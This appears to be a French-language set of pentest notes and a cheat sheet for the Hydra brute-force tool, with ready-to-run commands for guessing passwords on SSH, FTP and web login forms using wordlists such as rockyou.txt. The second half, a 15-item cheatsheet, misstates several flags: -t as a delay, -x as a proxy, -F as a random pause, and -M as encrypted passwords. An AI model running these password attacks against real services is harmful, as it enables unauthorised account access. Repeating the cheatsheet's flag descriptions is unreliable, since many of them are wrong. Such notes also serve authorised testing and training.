# Guide Hydra

# I) Généralités
* Hydra permet de faire du bruteforce en ligne sur les systèmes d'authentification comme pour les services SSH, formulaire d'application web, FTP ou SNMP
* S'effectue via ligne de commande 
* Listes de protocoles que hydra peut forcer : 
```
Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 et v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC et XMPP
```

# II) Installation de hydra
* Déjà présent sur Kali


# III) Utilisation de hydra
* Toujours tenter se de connecter sur le service avant 

## Scenario 1 : On connait que le login
* Syntaxe de base 
```
hydra -l @login -P @wordlist @ip_cible @service -f
```
* Service FTP
```
hydra -l @user -P @passlist.txt ftp://@MACHINE_IP
```
* Service SSH
```
﻿hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
﻿-t : Nombre de threads à utiliser
﻿-l : Login
﻿-p : fichier avec mp
```
* Formulaire WEB (verifier les noms de champs username et password)
	* On un page de log avec l'URL : http://ip/login
```
hydra -l admin -P /usr/share/wordlist/rockyou.txt @ip http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

* Exemple d'un HTTP-GET sur un formulaire de connexion
```
hydra -l admin -P /usr/share/wordlist/rockyou.txt @ip http-get-form "/login:username=^USER^&password=^PASS^:F=incorrect:H=Cookie: PHPSESSID=f654f68sfs6d5f49; security=high"
```
## Scenario 2 : On connait que le mot de passe
* Syntaxe de base 
```
hydra -L @/wordlist -p @password @ip_cible @service -f
```

# Hydra Cheatsheet:

1. Lancer une attaque de force brute sur un service spécifique :
```
hydra -l <utilisateur> -P <fichier_mots_de_passe> <adresse_IP> <protocole> -s <port> <service>
```

2. Lancer une attaque de force brute en utilisant une liste d'utilisateurs :
```
hydra -L <fichier_utilisateurs> -P <fichier_mots_de_passe> <adresse_IP> <protocole> -s <port> <service>
```
3. Lancer une attaque de force brute en utilisant une liste de mots de passe :
```
hydra -l <utilisateur> -p <fichier_mots_de_passe> <adresse_IP> <protocole> -s <port> <service>
```
4. Lancer une attaque de force brute en utilisant une liste de mots de passe et un délai entre les tentatives :
```
hydra -l <utilisateur> -P <fichier_mots_de_passe> <adresse_IP> <protocole> -s <port> <service> -o output.txt -t <temps_entre_les_tentatives>
```
5. Lancer une attaque de force brute en utilisant une liste d'utilisateurs et un mot de passe par défaut :
```
hydra -L <fichier_utilisateurs> -p <mot_de_passe> <adresse_IP> <protocole> -s <port> <service>
```
6. Lancer une attaque de force brute en utilisant un fichier de mots de passe aléatoires :
```
hydra -l <utilisateur> -x <min:max:incr> <adresse_IP> <protocole> -s <port> <service>
```
7. Lancer une attaque de force brute en utilisant un proxy :
```
hydra -l <utilisateur> -P <fichier_mots_de_passe> <adresse_IP> <protocole> -s <port> <service> -o output.txt -x 3.14.15.92:3128
```
8. Lancer une attaque de force brute en utilisant une liste de mots de passe et en limitant le nombre de tentatives par seconde :
```
hydra -l <utilisateur> -P <fichier_mots_de_passe> <adresse_IP> <protocole> -s <port> <service> -o output.txt -t 8 -w 3
```
9. Lancer une attaque de force brute en utilisant une liste de mots de passe chiffrés :
```
hydra -l <utilisateur> -e nsr -m <fichier_mots_de_passe_chiffrés> <adresse_IP> <protocole> -s <port> <service>
```
10. Utiliser un dictionnaire personnalisé pour l'attaque de force brute :
```
hydra -l <utilisateur> -P <fichier_dictionnaire> <adresse_IP> <protocole> -s <port> <service>
```
11. Lancer une attaque de force brute en utilisant un fichier de configuration personnalisé :
```
hydra -C <fichier_config> <adresse_IP> <protocole> -s <port> <service>
```
12. Lancer une attaque de force brute avec une pause aléatoire entre les tentatives :
```
hydra -l <utilisateur> -P <fichier_mots_de_passe> <adresse_IP> <protocole> -s <port> <service> -o output.txt -F
```
13. Lancer une attaque de force brute en utilisant le mode "non-authentifié" :
```
hydra -l <utilisateur> -P <fichier_mots_de_passe> <adresse_IP> <protocole> -s <port> <service> -o output.txt -e n
```
14. Lancer une attaque de force brute avec une liste de mots de passe chiffrés précalculés :
```
hydra -l <utilisateur> -M <fichier_mots_de_passe_chiffrés> <adresse_IP> <protocole> -s <port> <service>
```
15. Utiliser un délai entre les tentatives pour éviter le blocage du compte :
```
hydra -l <utilisateur> -P <fichier_mots_de_passe> <adresse_IP> <protocole> -s <port> <service> -o output.txt -W 3
```